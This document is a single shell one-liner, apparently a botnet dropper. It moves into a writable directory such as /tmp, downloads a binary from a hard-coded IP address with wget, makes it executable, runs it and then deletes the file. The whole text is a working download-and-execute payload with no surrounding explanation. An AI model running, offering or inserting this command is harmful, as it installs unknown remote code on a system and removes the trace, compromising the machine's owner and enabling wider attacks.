cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.46.224.101/wget; chmod +x wget; ./wget; rm -rf wget
